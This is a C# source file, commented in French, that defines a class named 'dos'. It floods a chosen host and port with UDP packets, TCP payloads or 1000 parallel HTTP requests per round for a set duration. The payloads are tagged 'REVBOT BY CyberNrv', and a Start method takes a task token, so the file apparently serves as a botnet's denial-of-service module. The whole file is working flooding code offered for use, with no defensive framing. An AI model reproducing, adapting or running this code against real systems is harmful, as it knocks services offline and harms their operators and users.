using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

public class dos
{
    public static string method = "UDP";
    public static string host = "http://localhost";
    public static int port = 80;
    public static int duration = 10; // Durée en secondes
    public static string total_mbps = "0";
    public static string total_ms = "0";
    public static void Start(string task_token)
    {
        if(method == "UDP")
        {
            DosUDP();
        }
        if(method == "TCP")
        {
            DosTCP();
        }
        if (method == "HTTP")
        {
            CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = cancellationTokenSource.Token;
            DosHTTP(cancellationToken);
        }
    }
    static string DosUDP()
    {
        long totalBytesSent = 0;
        DateTime startTime = DateTime.Now;

        // Démarrer un thread pour exécuter SendUdp en arrière-plan
        Thread udpThread = new Thread(() =>
        {
            TimeSpan durationSpan = TimeSpan.FromSeconds(duration);
            while (DateTime.Now - startTime < durationSpan)
            {
                string messageSentThisIteration = SendUdp(); // Modifier le type de la variable
                totalBytesSent += Encoding.UTF8.GetBytes(messageSentThisIteration).Length; // Calculer la taille des données envoyées
                Thread.Sleep(1); // Attente d'une seconde avant la prochaine itération
            }
        });
        udpThread.Start();

        // Attendre la fin du thread UDP
        udpThread.Join();

        // Calcul du débit en Mbps
        double elapsedTimeInSeconds = (DateTime.Now - startTime).TotalSeconds;
        double totalMegabitsSent = totalBytesSent * 8 / 1000000; // Conversion en mégabits
        double mbps = totalMegabitsSent / elapsedTimeInSeconds;

        Console.WriteLine($"Débit : {mbps} Mbps");
        total_mbps = mbps.ToString();
      return mbps.ToString();
        
    }


    public static string SendUdp()
    {
        // Créer une instance UdpClient
        using (UdpClient udpClient = new UdpClient())
        {
            try
            {
                string message = "REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv";
                message = message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message;
                
                byte[] bytes = Encoding.UTF8.GetBytes(message);

                // Envoyer les données au destinataire
                udpClient.Send(bytes, bytes.Length, host, port);

                Console.WriteLine("+1 UDP");
                return message;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erreur lors de l'envoi de la requête UDP : {ex.Message}");
            }
            return "0";
        }
    }
    static void DosTCP()
    {
        long totalBytesSent = 0;
        DateTime startTime = DateTime.Now;

        // Démarrer un thread pour exécuter SendTcp en arrière-plan
        Thread tcpThread = new Thread(() =>
        {
            TimeSpan durationSpan = TimeSpan.FromSeconds(duration);
            while (DateTime.Now - startTime < durationSpan)
            {
                string messageSentThisIteration = SendTcp(); // Modifier le type de la variable
                totalBytesSent += Encoding.UTF8.GetBytes(messageSentThisIteration).Length; // Calculer la taille des données envoyées
                Thread.Sleep(1); // Attente d'une seconde avant la prochaine itération
            }
        });
        tcpThread.Start();

        // Attendre la fin du thread TCP
        tcpThread.Join();

        // Calcul du débit en Mbps
        double elapsedTimeInSeconds = (DateTime.Now - startTime).TotalSeconds;
        double totalMegabitsSent = totalBytesSent * 8 / 1000000; // Conversion en mégabits
        double mbps = totalMegabitsSent / elapsedTimeInSeconds;

        Console.WriteLine($"Débit : {mbps} Mbps");
        total_mbps = mbps.ToString();
    }

    static string SendTcp()
    {
        try
        {
            // Créer une instance TcpClient
            using (TcpClient tcpClient = new TcpClient())
            {
                // Se connecter au serveur
                tcpClient.Connect(host, port);

                // Envoyer des données au serveur
                string message = "REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv  REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv REVBOT BY CyberNrv";
                message = message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message + message;

                byte[] data = Encoding.UTF8.GetBytes(message);
                NetworkStream stream = tcpClient.GetStream();
                stream.Write(data, 0, data.Length);

                Console.WriteLine("+1 TCP");
                return message;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erreur lors de l'envoi de la requête TCP : {ex.Message}");
        }
        return "0";
    }



    static async Task DosHTTP(CancellationToken cancellationToken)
    {
        DateTime startTime = DateTime.Now;

        // Nombre total de requêtes envoyées
        long totalRequests = 0;

        // Boucle pour envoyer des requêtes HTTP de manière parallèle
        while ((DateTime.Now - startTime).TotalSeconds < duration && !cancellationToken.IsCancellationRequested)
        {
            // Liste pour stocker les tâches de requête HTTP
            List<Task> tasks = new List<Task>();

            // Créer un nombre élevé de tâches pour envoyer les requêtes HTTP
            for (int i = 0; i < 1000; i++) // Vous pouvez ajuster ce nombre selon vos besoins
            {
                // Créer une nouvelle tâche pour envoyer une requête HTTP
                Task task = SendHttpRequestAsync(host, cancellationToken);

                // Ajouter la tâche à la liste
                tasks.Add(task);
            }

            // Attendre que toutes les tâches se terminent
            await Task.WhenAll(tasks);

            // Incrémenter le nombre total de requêtes
            totalRequests += tasks.Count;
        }

        // Calculer le nombre de requêtes par seconde
        double elapsedTimeInSeconds = (DateTime.Now - startTime).TotalSeconds;
        double requestsPerSecond = totalRequests / elapsedTimeInSeconds;

        Console.WriteLine($"Requêtes par seconde : {requestsPerSecond}");
    }

    static async Task SendHttpRequestAsync(string host, CancellationToken cancellationToken)
    {
        try
        {
            // Construire l'URL avec le protocole 'https://'
            string url = $"{host}";

            // Créer une instance HttpClient
            using (HttpClient client = new HttpClient())
            {
                // Envoyer une requête HTTP GET asynchrone
                HttpResponseMessage response = await client.GetAsync(url, cancellationToken);

                // Vérifier si la réponse est réussie
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Requête HTTP réussie !");
                }
                else
                {
                    Console.WriteLine($"Erreur lors de la requête HTTP : {response.StatusCode}");
                }
            }
        }
        catch (OperationCanceledException)
        {
            // Gérer l'annulation de la requête
            Console.WriteLine("Requête HTTP annulée.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erreur lors de l'envoi de la requête HTTP : {ex.Message}");
        }
    }


}
